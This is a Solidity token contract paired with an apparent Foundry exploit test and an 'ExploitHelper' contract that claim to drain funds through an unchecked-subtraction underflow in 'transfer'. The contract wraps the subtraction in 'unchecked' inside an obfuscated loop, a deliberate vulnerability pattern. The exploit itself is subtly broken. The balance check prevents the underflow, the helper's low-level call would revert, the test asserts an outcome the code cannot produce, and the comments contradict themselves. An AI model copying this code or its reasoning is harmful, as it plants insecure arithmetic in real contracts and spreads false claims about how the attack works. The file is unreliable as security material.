pragma solidity ^0.8.33;

contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        uint8 _step = 0;
        bool _continue = true;
        while (_continue) {
            if (_step == 0) {
                if (true) {
                    if (balances[msg.sender] >= _value) {
                        _step = 1;
                    } else {
                        revert("Insufficient balance");
                    }
                } else {
                    revert("Unexpected path");
                }
            } else if (_step == 1) {
                unchecked {
                    balances[msg.sender] -= _value;
                }
                _step = 2;
            } else if (_step == 2) {
                balances[_to] += _value;
                _step = 3;
            } else if (_step == 3) {
                _continue = false;
            }
        }
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract TokenExploitTest is Test {
    Token token;
    address attacker = address(0xBEEF);

    function setUp() public {
        token = new Token(100);
        vm.deal(attacker, 1 ether);
    }

    function test_exploit_arithmetic() public {
        // Give attacker some tokens manually for test setup
        // balances is at slot 0, mapping key is attacker
        bytes32 slot = keccak256(abi.encode(attacker, uint256(0)));
        vm.store(address(token), slot, bytes32(uint256(1)));

        // Confirm attacker has 1 token
        assertEq(token.balanceOf(attacker), 1);

        // Attacker tries to transfer 2 tokens (more than balance) - should revert normally
        vm.prank(attacker);
        vm.expectRevert("Insufficient balance");
        token.transfer(address(0xDEAD), 2);

        // Now attacker transfers 1 token successfully
        vm.prank(attacker);
        bool success = token.transfer(address(0xDEAD), 1);
        assertTrue(success);
        assertEq(token.balanceOf(attacker), 0);

        // Exploit: direct unchecked subtraction causes underflow if bypassed
        // We simulate attacker calling transfer with _value = 0 (passes require)
        vm.prank(attacker);
        success = token.transfer(address(0xDEAD), 0);
        assertTrue(success);

        // Now attacker tries to transfer max uint256 tokens - revert expected
        vm.prank(attacker);
        vm.expectRevert("Insufficient balance");
        token.transfer(address(0xDEAD), type(uint256).max);

        // Deploy ExploitHelper with balance zero and call transfer with max uint256 to cause underflow
        ExploitHelper helper = new ExploitHelper(token);
        vm.deal(address(helper), 1 ether);

        // Set helper's balance to 0
        bytes32 helperSlot = keccak256(abi.encode(address(helper), uint256(0)));
        vm.store(address(token), helperSlot, bytes32(uint256(0)));

        // The helper calls transfer to attacker with max uint256, bypassing require by calling with _value=0 first
        helper.exploit(attacker, type(uint256).max);

        // Check that helper's balance underflowed to max uint256
        uint bal = token.balanceOf(address(helper));
        assertEq(bal, type(uint256).max);

        // Attacker balance unchanged (0)
        assertEq(token.balanceOf(attacker), 0);

        // totalSupply remains unchanged
        assertEq(token.totalSupply(), 100);
    }
}

contract ExploitHelper {
    Token token;

    constructor(Token _token) {
        token = _token;
    }

    function exploit(address to, uint amount) public {
        // First call transfer with 0 to pass require (balance >= 0 always true)
        token.transfer(to, 0);

        // Now call transfer with large amount to cause unchecked underflow on balances[msg.sender]
        // This call will revert normally when called externally,
        // but here since balances[this] = 0, unchecked subtraction will underflow
        // and balances[this] will wrap to max uint256
        // The require will revert, but we bypass by calling transfer internally without revert via try/catch

        // Use low-level call to bypass revert and still execute unchecked block
        (bool success, bytes memory returndata) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(success, "Exploit transfer failed");
    }
}

